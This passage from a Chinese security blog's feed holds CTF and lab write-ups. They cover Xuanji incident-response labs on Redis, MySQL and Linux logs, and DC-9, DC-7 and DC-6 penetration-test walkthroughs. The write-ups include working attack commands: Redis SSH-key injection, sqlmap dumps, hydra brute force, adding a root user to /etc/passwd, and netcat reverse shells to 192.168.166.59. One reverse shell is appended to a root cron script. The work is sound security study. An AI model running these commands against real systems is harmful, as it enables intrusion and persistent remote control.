#写入保存路径的shell文件</span><br></pre></td></tr></table></figure><p>分析主机的定时任务表就能发现反弹shell的情况了：crontab -l</p><p> 这是因为攻击者可能会利用定时任务（cron jobs）来保持对系统的持久访问，或者定时反弹一个 Shell 到攻击者的机器  </p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744105310803-2e86b15a-a103-4209-8573-027e210bcbb9.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p> 通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交  </p><p>同样，redis的攻击手法中也有利用ssh-keygen 公钥登录服务器的方式</p><p>当redis以root身份运行，可以给root账户写入ssh公钥权限，直接通过ssh登录服务器，<br>在攻击机中申生成ssh公钥和私钥，密码设为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">进入.ssh目录:cd .ssh/ 将生成的公钥保存到1.txt</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</span><br><span class="line">cat 1.txt | redis-cli -h [redis的ip] -x set crack</span><br><span class="line">redis-cli -h 192.168.157.129</span><br><span class="line">config set dir /root/.ssh       #更改redis备份路径为ssh公钥存放目录（一般为/root/.ssh）</span><br><span class="line">config set dbfilename authorized_keys  #设置上传公钥的备份文件名字为authorized_keys</span><br><span class="line">config get dbfilename #检查是否更改成功 </span><br><span class="line">save      #保存 </span><br><span class="line">exit       #退出</span><br><span class="line">ssh -i id_rsa root@redis的IP   #在攻击机上使用ssh免密登录靶机</span><br></pre></td></tr></table></figure><p>也就是说会向靶机上写入ssh密钥，我们查看一下靶机的&#x2F;root&#x2F;.ssh,确实有一个被写入的公钥authorized_keys</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744105584447-54b4717b-65ac-46d5-9c9c-255cad822358.png" alt="img">去github搜：flag{xj-test-user-wow-you-find-flag} </p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744105871933-8f4c9bc8-e319-4fe1-b410-3a046fa2f009.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p> 通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;  </p><p>cd &#x2F;usr&#x2F;bin<br>ls -al</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744106137798-f7521e32-80ba-4f8d-868f-922fb4f3a828.png" alt="img"></p><p>发现一个ps</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1744106183514-c85c3863-240d-4b98-9c0c-390b3d0a3959.png" alt="img"></p><p>flag{c195i2923381905517d818e313792d196}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志分析-mysql应急响应</title>
      <link href="/2025/04/08/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2025/04/08/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<p>a终于来到了第二章了</p><span id="more"></span><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>1.黑客第一次写入的shell flag{关键字符串} </p><p>首先连接吧</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743992450456-9c8ac73b-c90a-4251-8aed-82c27c045ff5.png" alt="img"></p><p>直接进入根目录，然后查找flag</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743992547295-5bd171de-25aa-4c34-82d3-680232556d53.png" alt="img"></p><p>flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>2.黑客反弹shell的ip flag{ip}</p><p>查看mysql日志文件，发现一个比较可疑的地方：尝试执行 &#x2F;tmp&#x2F;1.sh这个脚本。</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743992932236-2fa0e347-853a-413f-88f4-edf31e6ff101.png" alt="img"></p><p>然后跟着这个思路追溯到  &#x2F;tmp&#x2F;1.sh这个目录下。发现反弹shell的命令。</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743993020384-7216a45c-77c6-456b-9309-ae7cacf1acb9.png" alt="img"></p><p>得到flag2：flag{192.168.100.13}</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>3.黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</p><p>要提权，hacker肯定先知道了账号密码，可以猜想web目录下有页面泄露了，mysql的账号密码。</p><p>find  &#x2F;var&#x2F;www&#x2F;html | xargs grep “root”</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743993183409-d093ae73-546a-4b25-9f03-6bc450fbe7db.png" alt="img"></p><p>发现了密码：334cc35b3c704593</p><p>然后mysql进行连接。mysql -uroot -p334cc35b3c704593</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743993622112-b9134e11-33ff-4427-95cb-93554e4d37fa.png" alt="img"></p><p>然后查询mysql数据库中的所全局系统变量，里面包含secure的变量及当前值。</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743994205795-e7668f8c-6271-4d8a-b549-2136d7d9d8d2.png" alt="img"></p><p>secure_file_priv为空，具有写入权限，一般进行了提权，一定会在&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;目录下留下痕迹</p><p>来到这个目录：这个目录是mysql存放用户自定义函数的，出现了一个udf.so文件，肯定是有人写入了一个自定义函数到库中</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743994503466-97a13c02-5643-4d89-9047-968e6fd3433c.png" alt="img"></p><p>得到flag：flag{b1818bde4e310f3d23f1005185b973e7}</p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>黑客获取的权限 flag{whoami后的值}</p><p>既然hacker进行了提权，在库中写入了自定义函数，我们去数据库中查询一下</p><p>select * from mysql.func;</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743994676607-a13f3f34-04be-4667-9e5f-35b69ee141ef.png" alt="img"></p><p>sys_eval这个表会查询到新增函数，使用新增的这个函数执行系统命令。</p><p>select sys_eval(“whoami”);</p><p><img src="/../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1743994785180-3646a0cb-46a8-456c-b807-5bc7583c4c00.png" alt="img"></p><p>flag{mysql}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应-Linux入侵排查</title>
      <link href="/2025/04/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/"/>
      <url>/2025/04/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<p>通过ssh连接靶机</p><span id="more"></span><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>1.web目录存在木马，请找到木马的密码提交</p><p>直接去网站目录：&#x2F;var&#x2F;www&#x2F;html</p><p>得到密码1</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/1743931397075-90d2f6b7-a4a6-4716-a183-0c5206fb8af6.png" alt="img"></p><p>flag{1}</p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>2.服务器疑似存在不死马，请找到不死马的密码提交</p><p>首先查找木马具有的特征。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot;</span><br></pre></td></tr></table></figure><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/1743931539424-fd0b1332-ab56-4b19-bbd1-abd1a10513c5.png" alt="img"></p><p>一个找到三个，最后锁定index.php。因为有个file_put_contents函数，还故意修改时间戳。很可疑</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/1743930266173-9bd2d633-b9cd-4bea-a733-320204ed7897.png" alt="img"></p><p>得到密码为：hello</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>3.不死马是通过哪个文件生成的，请提交文件名</p><p>有了flag2的基础，可以得到，不死马是通过index.php生成的。</p><p>flag{index.php}</p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>4.黑客留下了木马文件，请找出黑客的服务器ip提交</p><p>首先查看日志，看有没有进行暴力破解的痕迹。日志位置：&#x2F;var&#x2F;log&#x2F;auth.log.1，最后都没有发现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;shell.php&quot; /var/log/auth.log.1</span><br><span class="line">cat auth.log.1 |grep &quot;Accepted password&quot;</span><br></pre></td></tr></table></figure><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/1743932591549-8b7f884c-0ec6-4218-8902-406ec02c578b.png" alt="img"></p><p>这个时候回到网站根目录，运行 shell(1).elf，这个时候，没有任何回显。现在启动新的一个ssh连接，输入命令：</p><p>netstat -antlp | more</p><p>这个时候会发现一个ip。10.11.55.21</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/1743932847571-68b13b6d-607a-4371-b677-527f1e511f8d.png" alt="img"></p><p>得到flag：flag{10.11.55.21}</p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>由flag4可以得到端口：3333</p>]]></content>
      
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应-Linux日志分析</title>
      <link href="/2025/04/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2025/04/04/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>又是当菜鸡的一天，又是被折磨，呜呜呜，打开往下看吧</p><span id="more"></span><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743761745687-57194c61-14ee-460c-bff5-301a2ffc5a1e.png" alt="img"></p><p>1、有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</p><p>先找到日志的位置，一般来说，SSH登录尝试会记录在 <code>/var/log/auth.log.1</code></p><p>lsb_release -a查询操作系统版本，发现是debian     <img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743761865223-6e56ea13-3cfd-420b-9d60-892bce422d72.png" alt="img"></p><p>cat &#x2F;var&#x2F;log&#x2F;auth.log.1</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743762329040-ee7c5f18-4e07-4eee-b98f-9caa8fd265a5.png" alt="img"></p><p>发现日志中有ssh连接root的，这些ssh会出现：Failed password…</p><p>使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743762511483-e18b5ee6-ee56-4587-9ccc-d28afd27f275.png" alt="img"></p><p>也可以使用这个：cat auth.log.1 | grep -a “Failed password for root” </p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743762469373-d7abf89b-a3b7-4583-b33b-b4ed129f29fb.png" alt="img"></p><p>发现有三个ip，得到flag：flag{192.168.200.2,192.168.200.31,192.168.200.32}</p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</p><p>爆破成功会出现Accepted标识。所以顺着以上思路：cat auth.log.1 | grep -a &quot;Accept&quot;</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743762836247-a85a59da-fe46-4516-8055-58ec35ef2450.png" alt="img"></p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743762915724-bf2f1218-2a64-4e77-8e45-88825ca5657a.png" alt="img"></p><p>flag:flag{192.168.200.2}</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>爆破用户名字典是什么？如果有多个使用”,”分割</p><p>仔细观察日志会发现一些爆破的时候的用户名，会出现这个字段：Failed password for invalid user</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743763370635-4ef19c72-104f-439a-b308-9bf6e2a322d0.png" alt="img"></p><p>于是修改语句： cat auth.log.1 | grep -a “Failed password for invalid user”</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743763453144-33d4f2ee-1ddd-49bf-a55f-335d2f38940c.png" alt="img"></p><p>把这些用户名扒下来得到flag：flag{user,hello,root,test3,test2,test1}    记得加上root</p><p>也可以使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for invalid user&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c</span><br></pre></td></tr></table></figure><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743763653328-07864ea3-9b9a-4b8c-bd1a-20c39ae5737a.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>成功的ip爆破了多少次</p><p>cat auth.log.1 | grep -a “Failed password for root”        然后直接数</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743763838890-75d889ee-fc32-4b0b-b485-7541acb91f03.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>黑客登陆主机后新建了一个后门用户，用户名是多少</p><p>在linux中新建用户&#x2F;用户组会在日志中留下<code>new user/new group</code>的痕迹</p><p><img src="/../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/1743763995177-1c940b96-0845-4bbe-a0ee-49aa23e10be6.png" alt="img"></p><p>命令：cat auth.log.1 | grep -a &quot;new user&quot;</p><p>得到flag：flag{test2}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 玄机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dc-9</title>
      <link href="/2025/04/04/dc-9/"/>
      <url>/2025/04/04/dc-9/</url>
      
        <content type="html"><![CDATA[<p>w我要出人头地，crazy！第一步还是常见的信息搜集</p><span id="more"></span><p><img src="/../dc-9/1736851651514-f8b15749-e3e8-407c-812d-d62e7d5154d6.png" alt="img"></p><p><img src="/../dc-9/1736851785245-01d86d67-6f58-4ad3-8bd4-739de3f3a8a9.png" alt="img"></p><p>然后得到ip地址：192.168.166.136</p><p>然后进行常规的dirsearch目录扫描，这里为了清晰可以多加一个参数：-i 200</p><p>dirsearch -u 192.168.166.136 -i 200</p><p>表示只返回状态码为200的目录</p><p><img src="/../dc-9/1736856770019-4e4cddac-0ce0-4572-8ad4-3b4bba30e71a.png" alt="img"></p><p>然后访问web页面 ，找到一个搜索页面，可能与数据库进行交互，所以尝试sql注入<img src="/../dc-9/1736856976337-e8c23c6e-616e-4979-a267-c3c760f15e50.png" alt="img"></p><p>最后跑出来是存在sql注入的</p><p><img src="/../dc-9/1736858030326-e2ebf08f-8d2e-4e96-8920-ce2c05eeb28d.png" alt="img"></p><p>然后就是查询数据库为：Staff</p><p><img src="/../dc-9/1736858878300-72f39259-1fcd-4e5c-b9b3-05d95f88bf2d.png" alt="img"></p><p>查询表</p><p><img src="/../dc-9/1736858949920-049d43d5-b0c1-4c8a-bca8-7fec4edff063.png" alt="img"></p><p>然后直接就dump这个表</p><p>sqlmap -r dc9.txt -D ‘Staff’ -T ‘Users’ –dump </p><p><img src="/../dc-9/1736865143050-c5b28667-420e-447d-aa62-6327ea2a0d68.png" alt="img"></p><p>最后拿去一个网站解密（推荐去国外的网站，高效）</p><p><img src="/../dc-9/1736865183510-1298dd61-47b2-436b-87c4-ef21a3ae4d5f.png" alt="img"></p><p>最后得到一个密码：</p><p>transorbital1</p><p>成功登录 <img src="/../dc-9/1736865235122-4e7879c6-6bc7-4ab9-9cf3-d4b0892e72fa.png" alt="img"></p><p>最后因为那个file does not exist猜测，存在文件包含漏洞</p><p><img src="/../dc-9/1736866174360-cbd3b9d8-9675-4c53-810a-8be914ba9401.png" alt="img"></p><p>因为除了admin这个数据库还有一个user这个数据库，里面包含了一些用户的账号和密码。所以直接也把它dump出来</p><p><img src="/../dc-9/1736868174025-897a918d-f424-4fd3-96a7-515231608e2c.png" alt="img"></p><p>然后将得到的username和password导入到两个文件中</p><p>导入账号：</p><p>awk -F ‘|’ ‘NR &gt; 3 {print $6}’ data.txt | sed ‘s&#x2F;^ *&#x2F;&#x2F;;s&#x2F; *$&#x2F;&#x2F;‘ &gt; usernames.txt </p><p>导入密码：</p><p>awk -F ‘|’ ‘NR &gt; 3 {print $4}’ data.txt | sed ‘s&#x2F;^ *&#x2F;&#x2F;;s&#x2F; *$&#x2F;&#x2F;‘ &gt; passwords.txt</p><p>因为前面nmap搜集到的信息显示22端口是关闭的所以不能直接进行爆破</p><p><img src="/../dc-9/1736907515881-ad1b1e6d-74c3-4b92-848a-d686cc5ce74e.png" alt="img"></p><p>后面看到大佬的博客说，这里需要用到前面的文件包含漏洞，22端口不能访问的原因是因为存在knockd服务：<br>该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列号来敲门，使系统开启需要访问的端口，才能对外访问。不使用时，再使用自定义的序列号来关门，将端口关闭。不对外监听。进一步提升了服务和系统的安全。</p><p>默认的配置文件是：&#x2F;etc&#x2F;knockd.conf</p><p>于是利用文件包含找到了端口:7469,8475,9842</p><p><img src="/../dc-9/1736908396559-dfb69495-d91f-479c-ac82-141c4675dbc4.png" alt="img"></p><p>然后使用nmap按顺序扫描对应的端口就可以使用hydra进行爆破了</p><p>nmap 192.168.166.136 -p 7469</p><p>nmap 192.168.166.136 -p 8475</p><p>nmap 192.168.166.136 -p 9842</p><p>使用hydra爆破</p><p>hydra -L usernames.txt -P passwords.txt 192.168.166.136 ssh</p><p><img src="/../dc-9/1736909143288-9cb40c90-cc2b-4cc6-9294-909aed38bece.png" alt="img"></p><p>第一次只爆破出来了两个账号，但是第二次爆破出来了三个</p><p><img src="/../dc-9/1736915336406-665b4f0a-6373-47c4-9de1-7ebab78ca5eb.png" alt="img"></p><p>然后发现janitor这个账户想对于其他两个账户多了一个文件夹，最后打开发现是一个密码文件，</p><p><img src="/../dc-9/1736916165248-0e223acb-ee6c-4728-8808-651d9026ba72.png" alt="img"></p><p>将这些密码加入到刚刚爆破的密码里，再进行一次爆破，出了一个新的账号</p><p><img src="/../dc-9/1736919917179-d2224b72-eda6-45a6-921f-842a665bf6ff.png" alt="img"></p><p>登进去，最后的话也是发现了一个py脚本</p><p><img src="/../dc-9/1736919889767-40499cb9-e6b8-4f55-9b28-a7fec60effcb.png" alt="img"></p><p>使用openssl生成密码。</p><p>openssl passwd -1 -salt 123 admin</p><p>123：盐值</p><p>admin：密码</p><p><img src="/../dc-9/1736926012324-29845c68-6e92-4b42-ad79-359e6ea1ff3e.png" alt="img"></p><p>然后将这个写进去：admin:$1$123$Ok9FhQy4YioYZeBPwQgm3&#x2F;:0:0:admin:&#x2F;root:&#x2F;bin&#x2F;bash</p><p>最后的话就是将这个写入&#x2F;etc&#x2F;passwd</p><p><img src="/../dc-9/1736926201128-aa4d9047-72d5-4593-b9c8-b20bc82c1100.png" alt="img"></p><p>最后切换admin用户，发现已经是root权限了。最后直接去&#x2F;root拿flag</p><p><img src="/../dc-9/1736926295239-abef5e4f-c1f0-4759-97bb-538b6d589f68.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dc-7</title>
      <link href="/2025/04/04/dc-7/"/>
      <url>/2025/04/04/dc-7/</url>
      
        <content type="html"><![CDATA[<p>信息搜集</p><span id="more"></span><p><img src="/../dc-7/1736731970177-ebfbeb58-ad30-4896-a490-9f2485427ef8.png" alt="img">+</p><p>arp-scan -l  进行扫描</p><p><img src="/../dc-7/1736732118115-1a347030-9b89-4344-b6f8-06723f25c87e.png" alt="img"></p><p>得到ip地址：192.168.166.46</p><p>nmap进行端口扫描：</p><p>nmap -A 192.168.166.46 -p 1-65535</p><p><img src="/../dc-7/1736738930512-508b42b1-0ff4-490c-83ea-bb4812969dad.png" alt="img"></p><p>最后在一个backups.sh的文件里面发现了一个drush命令，然后直接使用这个命令修改admin的密码，这里为什么是admin，因为使用drush  user-information admin可以查询到admin的信息，所以这里就可以断定存在一个admin账号。</p><p><img src="/../dc-7/1736743320000-8a64dcbd-a488-4388-812c-946f8f07e38a.png" alt="img"></p><p>接着就是使用命令修改密码</p><p><img src="/../dc-7/1736743649392-c4ca18a8-cb81-43fa-a4e2-c072d4c97d7b.png" alt="img"></p><p> drush user-password admin –password&#x3D;”admin”</p><p><img src="/../dc-7/1736743693166-83030a7d-007a-437b-b189-e06f0929d1ee.png" alt="img"></p><p>然后登录进去发现一个可以传马的地方</p><p><img src="/../dc-7/1736744041263-eb494a86-8aff-4a43-b766-081b1809459d.png" alt="img">最后试了，发现不行，额，所以就尝试在一些文件里写马</p><p><img src="/../dc-7/1736746613668-95eb6bcc-1a96-4160-9bd7-afc030ecd9da.png" alt="img"></p><p>并没有发现支持php代码的</p><p><img src="/../dc-7/1736746661748-1b37c1e9-baec-464a-ba7e-225f7490a4b9.png" alt="img"></p><p>这个时候·需要安装php filter模块</p><p>php插件地址：<a href="https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz">https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz</a></p><p><img src="/../dc-7/1736746821089-35c4d84e-2c14-4158-857a-b05726c55f7f.png" alt="img"></p><p>这里也可以将网址输入进去</p><p><img src="/../dc-7/1736746861161-4d0a84eb-df86-4432-9f39-3ea923350406.png" alt="img"></p><p><img src="/../dc-7/1736747027139-05368b40-47ac-46ec-85ac-7b0ccd1b5017.png" alt="img"></p><p>成功<img src="/../dc-7/1736747086031-07bef71c-0a92-4475-8bd4-88dd9ecee83a.png" alt="img"></p><p>最后安装php filter</p><p><img src="/../dc-7/1736747135702-ea58eeb6-88ad-4f15-8c40-d00bfad9d355.png" alt="img"></p><p>最后就可以看到php的样式了，插入php代码</p><p><img src="/../dc-7/1736747309795-edfc27fb-0dc6-45d1-a9ad-c93bd91fe874.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43174545/1736747318171-2e7d3c40-239c-4bbe-82b1-291b1711ba10.png" alt="img"></p><p>发现已经可以执行命令了，这里就直接插入木马，然后用蚁剑连接，</p><p>成功连接</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43174545/1736747490166-e236daf6-e3fe-4bff-9df1-9e30a5360fba.png" alt="img"></p><p>然后反弹shell</p><p>nc 192.168.166.59 8888 -e &#x2F;bin&#x2F;bash</p><p><img src="/../dc-7/1736747694371-6d3d5e0c-2074-44c7-90c6-32b7333ff802.png" alt="img"></p><p>获取交互式页面：python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p><p>这里&#x2F;bin&#x2F;bash不能够拿到root的shell，因为这个backups.sh是以root权限的身份执行的，所以弹回来的shell也是root权限的shell</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43174545/1736748368974-97d256dc-48be-4b5a-b7f3-937925660d01.png" alt="img"></p><p>最后使用 &#x2F;bin&#x2F;sh就可以拿到root的shell</p><p>echo nc 192.168.166.59 8888 -e &#x2F;bin&#x2F;sh &gt;&gt; backups.sh</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43174545/1736748988832-daa360b7-44ec-4144-b038-146854b6abbd.png" alt="img"></p><p>最后进入root拿到最后的flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43174545/1736749026160-e0365082-e4fd-477e-b09a-89f152a2be7b.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dc-6</title>
      <link href="/2025/04/04/dc-6/"/>
      <url>/2025/04/04/dc-6/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><span id="more"></span><p><img src="/../dc-6/1735288296620-6e990584-3c1d-4e6b-b444-e8a8fe8548f8.png" alt="img"></p><p>得到mac地址：00:0C:29:DD:F7:B0</p><p>arp-scan -l，进行扫描</p><p><img src="/../dc-6/1735288422237-9d4b6ec4-fc77-4153-b653-c73fdafc1a22.png" alt="img"></p><p>得到ip地址为：192.168.3.57</p><p>使用nmap进行端口扫描：</p><p><img src="/../dc-6/1735288585150-aa6de545-c09f-472e-ae61-2ea79dac72f7.png" alt="img"></p><p>开了80的http服务，访问的时候它会重定向到wordy，需要修改配置文件，加入：</p><p>192.168.3.58 wordy</p><p>windows：”C:\Windows\System32\drivers\etc\hosts”</p><p><img src="/../dc-6/1735290524791-63970af8-6568-4646-a806-ba2f62745f1e.png" alt="img"></p><p>linux：&#x2F;etc&#x2F;hosts</p><p>然后dirsearch扫描，得到登录页面。</p><p><img src="/../dc-6/1735291045419-ba54adda-9990-4f69-ac60-09547b387545.png" alt="img"></p><p><img src="/../dc-6/1735291079765-17a28a86-62c4-4308-a04a-cdfe93746acd.png" alt="img"></p><p>因为cms是wordpress，所以使用工具wpscan进行用户名扫描：</p><p>wpscan –url <a href="http://wordy/">http://wordy/</a> -e u </p><p>最后发现了五个用户</p><p><img src="/../dc-6/1735291378182-32bef40e-f22e-471b-9754-e8bab81e3ec9.png" 